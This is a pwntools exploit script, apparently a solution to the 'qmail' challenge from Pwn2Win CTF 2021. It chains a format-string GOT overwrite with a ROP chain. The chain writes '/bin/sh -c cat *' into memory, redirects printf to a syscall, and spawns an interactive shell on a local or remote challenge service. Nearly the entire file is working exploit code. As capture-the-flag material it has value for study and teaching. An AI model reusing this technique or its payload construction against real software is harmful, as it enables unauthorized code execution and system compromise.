#!/usr/bin/python3

from pwn import *

context.terminal = 'tmux split -h'.split(' ')

frame = b'From: epicleet.team\nSubject: Pwn2Win CTF 2021 - '

elf = ELF('./qmail')

"""
0x000000000040589c : add rsp, 0x48 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040461b : leave ; ret

0x00000000004040ab : mov rax, qword ptr [rax] ; ret
0x00000000004040d9 : mov rax, rdi ; ret
0x000000000040577d : add dword ptr [rax - 0x7d], ecx ; ret
0x0000000000405919 : pop rcx ; and byte ptr [rax], al ; ret

0x0000000000406956 : mov qword ptr [rsi], rcx ; ret
0x0000000000403b7c : pop rsi ; ret
0x0000000000405b66 : mov qword ptr [rsi + 8], rdx ; ret
0x0000000000406a06 : pop rdx ; mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004050a6 : pop rdi ; ret
"""

mov_rax_rdi_addr = 0x4040d9 
pop_rcx_addr = 0x405919 
add_rax_ecx_addr = 0x40577d 

pop_rsi_addr = 0x403b7c 
mov_rsi_rdx_addr = 0x405b66 
pop_rdx_addr = 0x406a06 
pop_rdi_addr = 0x4050a6 

def set_rax(value):
    rop = b''
    rop += p64(pop_rdi_addr)
    rop += p64(value)
    rop += p64(mov_rax_rdi_addr)
    return rop
    
def add_to(addr, dword):
    rop = b''

    rop += set_rax(elf.bss(0))
    rop += p64(pop_rcx_addr)
    rop += p64(dword)

    rop += set_rax(addr + 0x7d)

    rop += p64(add_rax_ecx_addr)
    return rop

def set_rdx(value):
    rop = b''
    rop += p64(pop_rdx_addr)
    rop += p64(value)
    rop += p64(0xdeadbeef) * 3
    return rop

def write_to(addr, value):
    rop = b''
    rop += p64(pop_rsi_addr)
    rop += p64(addr-8)
    rop += set_rdx(value)
    rop += p64(mov_rsi_rdx_addr)
    return rop

# 1. Build format string

writes = {  elf.got._IO_putc: 0x40589c }
log.info(f'_IO_putc.got @ {hex(elf.got._IO_putc)}')

# fmt = fmtstr_payload(12, writes, numbwritten=135, write_size='int')[:-4]
# print(fmt)

# 2. Build ROP gadget

context.arch = 'amd64'

if args.REMOTE:
    libc = ELF('./libc-2.27.so')
    p = remote('qmail.nc.jctf.pro', 1337)
    syscall_off = 0x013c0

else:
    libc = elf.libc
    syscall_off = next(libc.search(asm('syscall')))

    if args.GDB:
        p = gdb.debug(elf.path, gdbscript='''
                break * 0x0000000000403b47
                continue
                ''')
    else:
        p = process(elf.path)

rop = b''
target_addr = elf.bss(0xf00)

arg0 = b'/bin/sh\x00'
arg1 = b'-c'.ljust(8, b'\x00')
# arg2 = b'ls'.ljust(8, b'\x00')
arg2 = b'cat *'.ljust(8, b'\x00')

cmd = arg0 + arg1 + arg2 + p64(target_addr) + p64(target_addr+8) + p64(target_addr+0x10) + p64(0)

# 2.1. Write command into memory

for i in range(0, len(cmd), 8):
    part = u64(cmd[i:i+8].ljust(8, b'\x00'))
    rop += write_to(target_addr + i, part)

# 2.2. Calculate system in memory

syscall_off = 0x013c0
delta = (syscall_off - libc.sym.printf) & 0xffffffff
rop += add_to(elf.got.printf, delta)

# 2.3. Call system(cmd)

rop += set_rdx(0)
rop += p64(pop_rsi_addr)
rop += p64(target_addr+0x18)
rop += set_rax(59)
rop += p64(pop_rdi_addr)
rop += p64(target_addr)

rop += p64(elf.sym.printf)


# 3. Send the payload to the server

fmt = b'%4216925c%14$n'

payload = frame + fmt + b'\n\n' + p64(elf.got._IO_putc) + p64(0xdeadbeef) * 5 + rop
log.info(f'payload length = {len(payload)}')

p.send(payload)

p.shutdown(direction='send')

start = p.recvuntil(b' - ')
# p.recvuntil(b'\x00')

p.interactive()
